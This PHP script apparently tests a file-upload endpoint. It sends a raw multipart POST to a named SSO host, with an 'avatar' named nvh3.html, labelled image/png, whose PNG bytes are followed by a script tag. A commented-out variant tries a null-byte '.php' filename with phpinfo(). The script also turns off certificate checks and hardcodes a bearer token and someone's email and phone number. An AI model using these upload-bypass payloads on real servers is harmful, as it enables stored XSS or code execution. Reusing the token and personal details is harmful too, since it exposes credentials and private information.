<?php

function buildPostRequestBody(): string
{
    // $boundary = "----NAT";
    $boundary = "----" . substr(md5(rand(0, 32000)), 0, 10);

    $nullByte = chr(0);

    // $imageHeading = 'GIF89a' . chr(0x39) . chr(0x61) . chr(0x18) . chr(0x01) . chr(0x5A) . chr(0x00) . chr(0x6E);
    $imageHeading = file_get_contents('sample.png');

    $postData = <<<POST
        --$boundary
        Content-Disposition: form-data; name="fullName"

        Nguyễn Văn Huyên 1
        --$boundary
        Content-Disposition: form-data; name="email"

        lockex1987@gmail.com
        --$boundary
        Content-Disposition: form-data; name="phone"

        0386519125
        --$boundary
        Content-Disposition: form-data; name="avatar"; filename="nvh3.html"
        Content-Type: image/png

        $imageHeading
        <script>alert(1)</script>
        --$boundary--
        POST;

    /*
    .php$nullByte
    <?php
    phpinfo();
    */
        

    $contentLength = strlen($postData);

    $body = <<<HTTP
        POST /api/user HTTP/1.1
        Host: sso-passport.cttd.tk
        Connection: Close
        Authorization: Bearer a4a139e8-6425-43fa-9a08-1b723c5c3aafY8ey7fESGVkDugpBGxGllMYdY4KSiSRlnIlg0t0MArRusbv5ZBAfBZyOdwpsGnsqMwoj8svQDaMdPZugXCC2YaUcRFGBnF4kyE9z
        Content-Type: multipart/form-data; boundary=$boundary
        Content-Length: $contentLength

        $postData
        HTTP;

    return $body;
}

function makeRequest(): void
{
    $context = stream_context_create([
        'ssl' => [
           'verify_peer' => false,
           'verify_peer_name' => false
        ]
    ]);
    $timeout = 30;

    $fp = stream_socket_client(
        'ssl://sso-passport.cttd.tk:443',
        $errno,
        $errstr,
        $timeout,
        STREAM_CLIENT_CONNECT,
        $context
    );
    
    if (!$fp) {
        echo "$errno: $errstr\n";
    } else {
        $body = buildPostRequestBody();
        fwrite($fp, $body);
        while (!feof($fp)) {
            echo fgets($fp, 1024);
        }
        fclose($fp);
    }
}

makeRequest();
